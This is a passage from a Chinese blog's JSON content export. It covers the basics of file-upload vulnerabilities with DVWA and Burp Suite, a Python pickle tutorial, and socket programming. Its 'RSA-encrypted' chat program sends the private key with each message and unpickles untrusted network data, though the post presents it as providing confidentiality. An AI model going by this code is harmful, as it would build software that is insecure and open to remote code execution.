文件上传漏洞原理及流程","date":"2020-03-24T16:00:00.000Z","updated":"2020-03-31T09:36:08.721Z","comments":true,"path":"2020/03/25/1.1 文件上传漏洞原理及流程/","link":"","permalink":"https://fishni.github.io/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/","excerpt":"本文主要内容 文件上传流程、漏洞原因 burpsuite简单安装 dvwa文件上传简单示例","text":"本文主要内容 文件上传流程、漏洞原因 burpsuite简单安装 dvwa文件上传简单示例 文件上传流程： 1.前端选择文件，进行提交 2.浏览器形成POST MultiPart报文发送到服务器 3.服务器中间件接收到报文，解析后交给相关后端代码进行处理 4.后端代码将上传的文件内容写入到临时文件中（PHP特有） 5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名 文件上传漏洞产生原因 文件上传未对上传的文件进行严格的验证和过滤，容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等） 如果上传的目标目录没有限制执行权限，导致上传的动态文件（比如：webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。 存在上传漏洞的必要条件 存在上传点 可以上传动态文件 上传目录有执行权限，并且上传的文件可执行 可访问到上传的动态文件 上传检测流程 BurpSuite简单安装 下载jdk 官网下载Burp Suite 2.1 参考链接：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite 简单代理配置 火狐浏览器：选项-》网络设置-》设置 burpsuite设置： 使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行） 在火狐浏览器url栏输入：about:config 然后在搜索栏输入：network.proxy.allow_hijacking_localhost dvwa文件上传low简单示例 burpsuite截包 使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式） 将代理都修改为端口9999 测试：","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"python序列化数据之pickle详解","slug":"python序列化数据之pickle详解","date":"2020-03-14T16:00:00.000Z","updated":"2020-03-30T06:32:58.535Z","comments":true,"path":"2020/03/15/python序列化数据之pickle详解/","link":"","permalink":"https://fishni.github.io/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/","excerpt":"学习python之pickle详解","text":"学习python之pickle详解 序列化和反序列化 便于存储（序列化过程：将文本信息转为==二进制数据流，易存储在硬盘中==） 反序列化从硬盘读取的数据，可得到原始数据 python程序运行中得到的字符串、列表等数据，要长久保存，方便之后使用（pickle模块可以将对象转换为已知可以传输或存储的格式） python中序列化和反序列化 将Python对象转换为二级制形式叫做序列化（Pickling） 将二进制数据流恢复为Python对象叫做反序列化（Unpickling） pickle 提供了一个简单的==持久化==功能，可以将对象以==文件==形式存放在磁盘上 只能在python中使用，可以序列化python中几乎所有的数据类型（列表、字典…） pickle序列化后的数据，可读性差 pickle序列化和反序列化示例 819pickling_unpickling_example.py 123456789101112131415161718192021222324252627282930313233import pickle# 定义类Partclass Part: number = 0 name = \"\" def __init__(self, number, name): self.number = number self.name = name def identify(self): print(\"Part Number: %d\"%(self.number)) print(\"Part Name: %s\"%(self.name)) # 实例化partpart1=Part(111, \"Spindle\");# Create a file to store the pickled object# 创建文件存储pickled对象objectRepository = open(\"ObjectFile.picl\", \"wb\"); # Pickle/serialize the python object and store the bytes into a binary file# 序列化Python对象并存储为二进制字节流pickle.dump(part1, objectRepository, protocol=pickle.HIGHEST_PROTOCOL)objectRepository.close() # Unpickle/de-serialize the python object and print the attributes of the object# 反序列化Python对象并打印对象属性objectRepository = open(\"ObjectFile.picl\", \"rb\",);reconstructedObject = pickle.load(objectRepository) # Print object attributes# 打印对象属性reconstructedObject.identify() 12 - 运行结果： (venv) yuhao@fishmouse:~/Envs/venv/project$ python 819pickling_unpickling_example.py Part Number: 111 Part Name: Spindle 12345678- 序列化的数据 &#96;&#96;&#96;python &gt;&gt;&gt; with open(&#39;ObjectFile.picl&#39;,&#39;rb&#39;) as f: ... f.read() ... b&#39;\\x80\\x04\\x959\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Part\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x06number\\x94Ko\\x8c\\x04name\\x94\\x8c\\x07Spindle\\x94ub.&#39; ==序列化==语法 pickle.dump参考链接 pickle.dump(obj,file[,protocol]) 序列化对象，将结果数据流写入到文件对象或者buffer中 参数protocol是序列化模式，一共有5种不同的类型，即（0,1,2,3,4）； （0,1,2）早期的版本，默认值为0（表示以文本形式序列化），值为1或2（表示以二级制的形式序列化）； （3,4）则是python3之后的版本 查看（3,4） 12345&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.HIGHEST_PROTOCOL4&gt;&gt;&gt; pickle.DEFAULT_PROTOCOL3 pickle.dump()：转换的字节流写入buffer中 示例：819pickle_dump_example.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import pickleimport io class Book: title = \"\" isbn = \"\" parts = None chapters = None def __init__(self, title, isbn, parts, chapters): self.title = title self.isbn = isbn self.parts = parts self.chapters = chapters def identify(self): print(\"Title of the book: %s\"%(self.title)) print(\"ISBN of the book: %s\"%(self.isbn)) print(\"Parts are:\") for part in self.parts: print(part) print(\"Chapters are:%s\"%(self.chapters))class Part: partName = \"\" beginChapter = -1 endChapter = -1 def __init__(self, partName, beginChapter, endChapter): self.partName = partName self.beginChapter = beginChapter self.endChapter = endChapter def __str__(self): stringRep = \"%s\"%(self.partName) return stringReppart1 = Part(\"Part 1\", 1, 3)part2 = Part(\"Part 2\", 4, 5) part3 = Part(\"Part 3\", 6, 7) bookTitle = \"Book yet to be written\";bookISBN = \"XXX-X-XX-XXXXXX-X\";bookParts = [part1, part2, part3]bookChapters = [\"Chapter 1\", \"Chapter 2\", \"Chapter 3\", \"Chapter 4\", \"Chapter 5\", \"Chapter 6\", \"Chapter 7\"];book = Book(bookTitle, bookISBN, bookParts, bookChapters)# 创建buffer存储pickle对象pickleBuffer = io.BytesIO()print(\"Pickling of the object into the memory buffer started\")# pickle.dump(book,pickleBuffer)print(\"Pickling of the object into the memory buffer ended\")print(\"Pickled buffer beginning address:\")print(pickleBuffer.getbuffer())print(\"Unpickling of the object from memory started\")#unpickledBook = pickle.loads(pickleBuffer.getbuffer())print(\"Unpickling of the object from memory ended\")print(\"Printing the attributes of unpickled object\")unpickledBook.identify() pickle.dumps()参数 pickle.dumps(obj, protocol=None,*,fix_imports=True) 与pickle.dump()区别，pickle.dumps()方法不需要写入文件中，他是直接返回一个序列化的bytes对象 ==反序列化==语法 pickle.load(file) 反序列化对象（将文件中数据解析为一个Python对象） ==注意==：load(file)时，要让Python能够找到类的定义,否则会报错 注意：参数file，必须是以二进制的形式进行操作（读取） 示例：819test_pickle.py 反序列方法pickle.loads() 参数如下： pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”) pickle.loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。示例如下： 12345&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.dumps([1,2,3])b'\\x80\\x03]q\\x00(K\\x01K\\x02K\\x03e.'&gt;&gt;&gt; pickle.loads(_)[1, 2, 3] 1234567891011121314#load(file)时，要让Python能够找到类的定义,否则会报错import pickle class Person: def __init__(self,n,a): self.name=n self.age=a def show(self): print(self.name+\" \"+str(self.age)) aa = Person(\"JGood\", 2) aa.show() # del Personf=open('p.txt','wb') pickle.dump(aa,f,0) f.close() 123456 注释掉删除类对象操作，若未注释则会报错del Person f&#x3D;open(&#39;p.txt&#39;,&#39;rb&#39;) bb&#x3D;pickle.load(f) f.close() bb.show() 运行结果： 123(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py JGood 2JGood 2 未注释结果： 1234567891011121314 (venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py JGood 2Traceback (most recent call last): File &quot;819test_pickle.py&quot;, line 15, in &lt;module&gt; bb&#x3D;pickle.load(f) AttributeError: Can&#39;t get attribute &#39;Person&#39; on &lt;module &#39;__main__&#39; from &#39;819test_pickle.py&#39;&gt; [p.txt](p.txt)文件中数据存储格式： &#96;&#96;&#96;python &gt;&gt;&gt; with open(&#39;p.txt&#39;,&#39;rb&#39;) as f: ... f.read() ... b&#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nPerson\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVJGood\\np7\\nsVage\\np8\\nL2L\\nsb.&#39;","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"python网络编程01","slug":"python网络编程01-socket-udp-tcp-rsa加密的全双工聊天程序","date":"2020-03-14T05:55:42.000Z","updated":"2020-03-30T05:51:24.632Z","comments":true,"path":"2020/03/14/python网络编程01-socket-udp-tcp-rsa加密的全双工聊天程序/","link":"","permalink":"https://fishni.github.io/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/","excerpt":"学习内容 了解socket基本概念 利用socket类方法获取主机、网络及目标服务的信息 UDP、TCP客户端/服务器编写 案例：python SOCKET实现RSA加密的全双工聊天程序","text":"学习内容 了解socket基本概念 利用socket类方法获取主机、网络及目标服务的信息 UDP、TCP客户端/服务器编写 案例：python SOCKET实现RSA加密的全双工聊天程序 学习步骤构建python环境同时开发多个python应用程序（共用一个Python，不同版本的包不兼容会产生无用包），利用virtualenv创建“Python虚拟环境”（小型、独立的、隔离功能的Python环境），从而避免产生无用包 利用virtualenvwrapper管理virtualenv虚拟环境 mkvirtualenv venv ：创建虚拟环境venv workon ：查看当前已有虚拟环境目录 workon venv ：进入venv虚拟环境 deactivate ：退出虚拟环境 rmvirtualenv venv：删除虚拟环境venv socket概念 运行在不同机器上的进程通过套接字发送报文来进行通信，套接字充当了两个进程通信的“中间人”，观察下图（OSI模型中）： 套接字是个通信端点，操作系统使用整数来标识套接字，Python使用socket.socket对象表示套接字（该对象内部表示的是操作系统标识套接字的整数，可利用fileno()方法查看），调用socket.socket对象的方法请求使用套接字的系统调用是，该对象会自动使用内部维护的套接字整数标识符 socket.socket对象的fileno()方法 1234&gt;&gt;&gt; import socket&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.fileno()3 IP地址、端口号 端口号（port）传输层协议内容、用来标识一个进程 一个端口号只能被一个进程占用 IP地址 + 端口号能标识网络上的某一台主机的某一个进程 套接字组成：IP地址和端口号就构成了一个网络中的唯一标识符，即套接字 套接字类型（常用的两种） 流套接字：创建socket对象时（用socket.SOCK_STREAM） 面向连接、可靠的数据传输服务。能够保证数据无差错、无重复、按顺序发送 数据包套接字：创建socket对象时，使用socket.SOCK_DGRAM 提供无连接服务。无需建立连接，只需将目的地址信息打包后发送；该服务使用UDP进行传输，延迟小且效率高，缺点不能保证数据传输的可靠性 利用socket类方法获取主机、网络及目标服务的信息 获取主机名、地址 12345&gt;&gt;&gt; import socket&gt;&gt;&gt; socket.gethostname()'fishmouse'&gt;&gt;&gt; socket.gethostbyname(_)'127.0.1.1' 获取远程设备IP地址（如获取：www.baidu.com） 12&gt;&gt;&gt; socket.gethostbyname('www.baidu.com')'14.215.177.38' 可看到socket.gethostbyname具有==域名解析的作用==，ping一下看通不通 12345(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ ping 14.215.177.38PING 14.215.177.38 (14.215.177.38) 56(84) bytes of data.64 bytes from 14.215.177.38: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;37.9 ms64 bytes from 14.215.177.38: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;39.4 ms64 bytes from 14.215.177.38: icmp_seq&#x3D;3 ttl&#x3D;55 time&#x3D;34.8 ms IP地址格式转换（打包成32位二进制格式）：socket类方法inet_aton、inet_ntoa inet_aton()使用 123456&gt;&gt;&gt; ip_addr ='127.0.0.1'&gt;&gt;&gt; socket.inet_aton(ip_addr)b'\\x7f\\x00\\x00\\x01'&gt;&gt;&gt; import binascii&gt;&gt;&gt; binascii.hexlify(_)b'7f000001' 观察看到，转换后的32位二进制格式，并调用binasci.hexlify以16进制形式表示二进制数据 10进制结果，单个字节转换 123&gt;&gt;&gt;import struct&gt;&gt;&gt; struct.unpack('B',b'\\x7f')[0]127 inet_ntoa()使用：32位二进制包转换为IPv4地址 12345a的主机字节序----------网络字节序 ---------b的主机字节序&gt;&gt;&gt; ip_addr ='127.0.0.1'&gt;&gt;&gt; socket.inet_aton(ip_addr)b'\\x7f\\x00\\x00\\x01'&gt;&gt;&gt; socket.inet_ntoa(_)'127.0.0.1' 通过指定的端口和协议找到服务名 socket.getservbyport() 12345678910&gt;&gt;&gt; socket.getservbyport(80)'http'&gt;&gt;&gt; socket.getservbyport(53)'domain'&gt;&gt;&gt; socket.getservbyport(25)'smtp'&gt;&gt;&gt; socket.getservbyport(21)'ftp'&gt;&gt;&gt; socket.getservbyport(3306)'mysql' socket.getservbyname() ：通过服务名获取端口 1234&gt;&gt;&gt; socket.getservbyname('ssh')22&gt;&gt;&gt; socket.getservbyname('http')80 linux系统中，etc/services文件中可查看相关服务和端口 主机字节序和网络字节序之间的转换 不同主机a，b之间通信，数据格式需转换 a的固有数据存储——-标准化——–转化成b的固有格式 也即为： ==a的主机字节序———-网络字节序 ———b的主机字节序== 主机字节序 主机内部，内存中数据的处理方式，可以分为两种： 大端字节序：按照内存的增长方向，高位数据存储在高位内存中 小端字节序：按照内存的增长方向，高位数据存储在低位内存中 socket.ntohl()、socket.htonl()、ntohs()、htons() 1234567891011&gt;&gt;&gt; data = 1234&gt;&gt;&gt; socket.htonl(data)3523477504&gt;&gt;&gt; socket.htons(data)53764&gt;&gt;&gt; socket.ntohl(data)3523477504&gt;&gt;&gt; socket.ntohs(data)53764 &gt;&gt;&gt; socket.ntohs(53764)1234 设定并获取默认的套接字超时时间 socket.gettimeout()、socket.settimeout() 12345&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.gettimeout()&gt;&gt;&gt; s.settimeout(100)&gt;&gt;&gt; s.gettimeout()100.0 默认套接字超时时间为0 套接字错误异常处理 try…except 套接字异常类型 as 参数… argparse：命令项选项与参数解析的模块 parser=argparse.ArgumentParser()：创建解析对象 parser.add_argument()：向对象中添加关注的命令行参数和选项 given_args = parser.parse_args()：对象解析 套接字发送和接收的缓冲区大小修改 socket中getsockopt()、setsockopt()方法 套接字阻塞模式和非阻塞模式 s= socket.socket() s.setblocking(1)：设为阻塞模式 s.setblocking(0)：设为非阻塞模式 默认情况下，TCP套接字处于阻塞模式 UDP 多路复用：允许多个会话共享同一介质或机制的一种解决方案 UDP支持多路复用：UDP协议提供端口号，用于对目标为同一机器上不同服务的多个数据包进行适当的多路分解 TCP：多路复用、可靠传输 UDP机制：仅使用IP地址和端口进行标识，以此将数据包发送至目标地址 使用自环接口的UDP服务器和 客户端 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# UDP client and server on localhost# 814udp_local.py import argparse, socketfrom datetime import datetimeMAX_BYTES = 65535# serverdef server(port): sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) sock.bind(('127.0.0.1',port)) # getsockname()返回sock示例对象的（地址，端口) print(\"Listening at &#123;&#125;\".format(sock.getsockname())) while True: data, address = sock.recvfrom(MAX_BYTES) text = data.decode('ascii') print(\"The client at &#123;&#125; says &#123;!r&#125;\".format(address,text)) text = 'Your data was &#123;&#125; bytes long '.format(len(data)) data = text.encode('ascii') sock.sendto(data,address)# 客户端def client(port): sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) text = 'The time is &#123;&#125;'.format(datetime.now()) data = text.encode('ascii') sock.sendto(data,('127.0.0.1',port)) # sock.getsockname()获取当前进程的（地址，端口）元组信息 print('The OS assigned me the address &#123;&#125;'.format(sock.getsockname())) data, address = sock.recvfrom(MAX_BYTES) text = data.decode() # format格式化字符串 print('The server &#123;&#125; replied &#123;!r&#125;'.format(address,text))if __name__ == '__main__': # 字典 choices = &#123;'client':client,'server':server&#125; # 创建参数解析对象 parser = argparse.ArgumentParser(description='Send and receive UDP locally') #添加要解析的参数 parser.add_argument('role',choices=choices,help ='which role to play') parser.add_argument('-p',metavar='PORT',type=int,default=1060,help='UDP port (default 1060)') # 参数解析 args = parser.parse_args() # 调用服务端或客户端函数 function = choices[args.role] function(args.p) 先运行服务端 python 814udp_local.py server 结果： Listening at (‘127.0.0.1’, 1060)The client at (‘127.0.0.1’, 60945) says ‘The time is 2019-08-16 16:34:56.276877’ 再运行客户端 python 814udp_local.py client The OS assigned me the address (‘0.0.0.0’, 60945)The server (‘127.0.0.1’, 1060) replied ‘Your data was 38 bytes long ‘ 混杂客户端与垃圾回复 814udp_local.py代码中，客户端程序存在安全隐患，如fg果服务端响应延迟一会，攻击者伪装成服务器的一个响应，客户端并没有检查是否是真正服务器的响应 先运行服务器，再将服务器暂停，创建一个快速发送信息的响应给客户端，再==fg命令==将暂停的服务器开启 客户端 观察到，客户端收到的数据实际上是伪装的数据，真正的服务器的响应没到客户端 混杂客户端 不考虑地址是否正确，接收并处理所有收到的数据包的网络监听客户端在技术上叫 作混杂( promiscuous )客户端 python SOCKET实现RSA加密的全双工聊天程序实现 题目背景 RSA加密解密是利用非对称秘钥解决传输过程中机密性的问题，将之用在聊天程序上，其中使用rsa模块，发送方生产公钥和私钥，然后使用公钥将信息加密后，利用pickle模块封装加密后的消息和私钥，然后发送给接收方，接收方同样通过pickle模块将消息进行解封，使用发送过来的私钥将消息解密，并将内容打印在屏幕上 题目要点 传输协议：TCP套接字创建客户端和服务端_ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 数据传输格式：pickle序列化数据 pickle.dumps()序列化 pickle.loads()反序列化 1234567891011&gt;&gt;&gt; import pickle&gt;&gt;&gt; encryptdata = 'hello'&gt;&gt;&gt; key = 882321&gt;&gt;&gt; message = pickle.dumps([encryptdata,key])&gt;&gt;&gt; type(message)&lt;class 'bytes'&gt;&gt;&gt;&gt; messageb'\\x80\\x03]q\\x00(X\\x05\\x00\\x00\\x00helloq\\x01J\\x91v\\r\\x00e.'&gt;&gt;&gt; origndata = pickle.loads(message)&gt;&gt;&gt; origndata['hello', 882321] 数据加密方式：RSA加解密 123456789&gt;&gt;&gt;data = 'hello'&gt;&gt;&gt; import rsa&gt;&gt;&gt; (PubKey,PrivateKey) = rsa.newkeys(512)&gt;&gt;&gt; encryptdata = rsa.encrypt(data.encode(),PubKey)&gt;&gt;&gt; encryptdatab'=\\\\\\x1c\\x93]^(Z/\\xac\\x81\\xfd\\xffj!\\x0b:r\\xb0\\x1b\\xf9\\x97VZ\\xdf\\xe1\\x9e2\\xb4\\x05G4\\x01\\x9f\\xc8\\xfd\\x1e\\x00\\xa1\\xb7\\xbdU\\x98\\xbc\\x1e5\\xa1yy\\xee$\\xcd\\xf8\\x10\\xf4\\xba\\t\\x84\\xba\\x13\\x99hs\\x8d'&gt;&gt;&gt; decryptdata = rsa.decrypt(encryptdata,PrivateKey)&gt;&gt;&gt; decryptdatab'hello' 题目图解 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import rsaimport socketimport threadingimport pickle PORT = 4396BUFF = 1024 def RsaEncrypt(str): # 利用rsa产生公钥、私钥 (PubKey, PrivateKey) = rsa.newkeys(512) content = str.encode('utf8') # 使用公钥加密 Encrypt_Str = rsa.encrypt(content, PubKey) # 返回加密信息和私钥 return (Encrypt_Str, PrivateKey) def RsaDecrypt(str, pk): Decrypt_Str = rsa.decrypt(str, pk) Decrypt_Str_1 = Decrypt_Str.decode('utf8') return Decrypt_Str_1 def SendMessage(Sock, test): while True: SendData = input() # 加密要发送的数据 (encryptdata, PrivateKey) = RsaEncrypt(SendData) # 打印加密后的数据 print('encrypted data is ' + str(encryptdata)) # pickel封装加密后的数据和私钥 Message = pickle.dumps([encryptdata, PrivateKey]) if len(SendData) &gt; 0: Sock.send(Message) def RecvMessage(Sock, test): while True: # 接收数据 Message = Sock.recv(BUFF) # pickle解封数据 (recvdata, PrivateKey) = pickle.loads(Message) # 对加密的数据解密 decryptdata = RsaDecrypt(recvdata, PrivateKey) if len(Message)&gt;0: print(\"receive message:\" + decryptdata) def main(): type = input('please input server or client:') if type == 'server': # 创建套接字 ServerSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 端口绑定 ServerSock.bind(('127.0.0.1',PORT)) # 服务器允许连接的个数 ServerSock.listen(5) print(\"listening......\") while True: ConSock,addr = ServerSock.accept() print('connection succeed' + '\\n' + 'you can chat online') # 多线程运用 thread_1 = threading.Thread(target = SendMessage, args = (ConSock, None)) thread_2 = threading.Thread(target = RecvMessage, args = (ConSock, None)) thread_1.start() thread_2.start() elif type == 'client': ClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ServerAddr = input(\"please input the server's ip address:\") ClientSock.connect((ServerAddr, PORT)) print('connection succeed, chat start!') thread_3 = threading.Thread(target = SendMessage, args = (ClientSock, None)) thread_4 = threading.Thread(target = RecvMessage, args = (ClientSock, None)) thread_3.start() thread_4.start() if __name__ == '__main__': main() 结果演示 先启动server进行监听 启动客户端连接server 客户端向服务器发送消息 服务器端接收到消息，并将消息打印在屏幕上 分析 综上，该程序利用的是TCP套接字保证了传输的可靠性，并利用多线程进行信息交互，pickle封装数据，rsa产生公钥、私钥、和加/解密等操作","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]}],"categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"XSS漏洞原理及利用","slug":"网络安全/XSS漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"},{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"机器学习算法","slug":"人工智能/机器学习算法","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/"},{"name":"文件上传漏洞原理及利用","slug":"网络安全/文件上传漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"HTTP","slug":"HTTP","permalink":"https://fishni.github.io/tags/HTTP/"},{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"},{"name":"GaussianNB","slug":"GaussianNB","permalink":"https://fishni.github.io/tags/GaussianNB/"},{"name":"算法","slug":"算法","permalink":"https://fishni.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"},{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]}